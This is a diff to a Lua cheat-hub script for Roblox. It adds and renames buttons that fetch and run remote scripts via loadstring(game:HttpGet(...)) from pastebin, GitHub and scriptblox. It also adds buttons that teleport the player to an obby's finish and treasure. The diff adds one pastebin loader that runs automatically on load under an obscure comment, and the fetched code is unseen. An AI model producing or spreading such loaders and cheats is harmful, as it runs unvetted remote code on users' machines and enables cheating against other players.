@@ -679,7 +679,7 @@ HubSection:NewButton("99% fail impossible obby teleport gui", "small tp gui by m
 loadstring(game:HttpGet("https://pastebin.com/raw/HQY7LiGn"))()
 end)
 
-HubSection:NewButton("Keubind letter tools GUI", "simple keybind gui", function()
+HubSection:NewButton("Keybind Tools GUI (unfinished)", "simple keybind gui", function()
 loadstring(game:HttpGet("https://pastebin.com/raw/1xrhfTD5"))()
 end)
 
@@ -773,6 +773,13 @@ HubSection:NewButton("FE RemX OP trolling gui", "trolling gui", function()
 loadstring(game:HttpGet("https://pastebin.com/raw/6TGpAUjr"))()
 end)
 
+HubSection:NewButton("Giga Hub", "hella skripts", function()-- Giga xhad hub
+loadstring(game:HttpGet('https://raw.githubusercontent.com/OWJBWKQLAISH/GigaChad-Hub/main/Version%20V3.5'))()
+end)
+
+HubSection:NewButton("Ez Hub", "yea", function()-- ez hub
+loadstring(game:HttpGet("https://scriptblox.com/raw/Ez-Hub_168"))()
+end)
 
 
 
@@ -1180,22 +1187,22 @@ end)
 
 local MoreSection = More:NewSection("99% fail impossible obby lokations (extras)")
 
-MoreSection:NewButton("chest", "teleport to the xhest",
+MoreSection:NewButton("TELEPORT ON TOP OF THE TREASURE", "teleport to the xhest",
 function()-- teleport to xhest
 Game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-911.98291015625, 2005.8095703125, -149.64857482910156)
 end)
 
-MoreSection:NewButton("behind the chest", "teleport to the xhest",
+MoreSection:NewButton("TELEPORT TO FINISH", "teleport to the xhest",
 function()-- teleport behind xhest
 Game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-921.2446899414062, 1995.87255859375, -150.1106719970703)
 end)
 
-MoreSection:NewButton("winners room", "teleport to the xhest",
+MoreSection:NewButton("WINNERS ROOM", "teleport to the xhest",
 function()-- teleport to winning room
 Game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(314.3387451171875, 17002.197265625, 202.53802490234375)
 end)
 
-MoreSection:NewButton("offixe", "sits u in the offixe seat",
+MoreSection:NewButton("SIT IN THE OFFIXE", "sits u in the offixe seat",
 function()-- sit in the offixe
 Game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(259.6474304199219, 17004.259765625,
 162.38287353515625)
@@ -1203,23 +1210,23 @@ Game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFram
 game.Players.LocalPlayer.Character.Humanoid.Sit = true
 end)
 
-MoreSection:NewButton("unknown area", "teleport to hidden area",
+MoreSection:NewButton("UNKNOWN AREA", "teleport to hidden area",
 function()-- teleport to hidden 99
 Game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(269.36907958984375, 17024.74609375,
 139.19142150878906)
 end)
 --game.Players.LokalPlayer.mesij
 loadstring(game:HttpGet("https://pastebin.com/raw/9pDtfnLD"))()
--- Kontrolled.P
+-- Kontrolled.P ;k, ;ki
 loadstring(game:HttpGet("https://pastebin.com/raw/REdW8kfE"))()
-
-
+--3rdstring.Users("b/%^\list*#")
+loadstring(game:HttpGet("https://pastebin.com/raw/yLMTk28W"))()
 
 
 --toggle the ui yes
 local MoreSection = More:NewSection("no")
 
-MoreSection:NewKeybind("Toggle ui", "toggle the ui yes", Enum.KeyCode.F6, function()
+MoreSection:NewKeybind("Toggle ui", "toggle the ui yes", Enum.KeyCode.LeftControl, function()
     Library:ToggleUI()
 end)
 
@@ -1235,7 +1242,7 @@ ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
 ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 
 Frame.Parent = ScreenGui
-Frame.BackgroundColor3 = Color3.fromRGB(128,0,32)
+Frame.BackgroundColor3 = Color3.fromRGB(34,139,34)
 Frame.BackgroundTransparency = 0.500
 Frame.Position = UDim2.new(0.858712733, 0, 0.1050062257, 0)
 Frame.Size = UDim2.new(0, 90, 0, 30)
@@ -1245,7 +1252,7 @@ TextButton.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
 TextButton.BackgroundTransparency = 1.000
 TextButton.Size = UDim2.new(1, 0, 1, 0)
 TextButton.Font = Enum.Font.GothamBold
-TextButton.Text = "toggle"
+TextButton.Text = "Toggle"
 TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
 TextButton.TextScaled = true
 TextButton.TextSize = 22.000
@@ -1253,8 +1260,8 @@ TextButton.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
 TextButton.TextStrokeTransparency = 0.000
 TextButton.TextWrapped = true
 TextButton.MouseButton1Down:Connect(function()
-	game:GetService("VirtualInputManager"):SendKeyEvent(true, "F6" , false , game)
+	game:GetService("VirtualInputManager"):SendKeyEvent(true, "LeftControl" , false , game)
 end)
 
 UITextSizeConstraint.Parent = TextButton
-UITextSizeConstraint.MaxTextSize = 30
+UITextSizeConstraint.MaxTextSize = 40
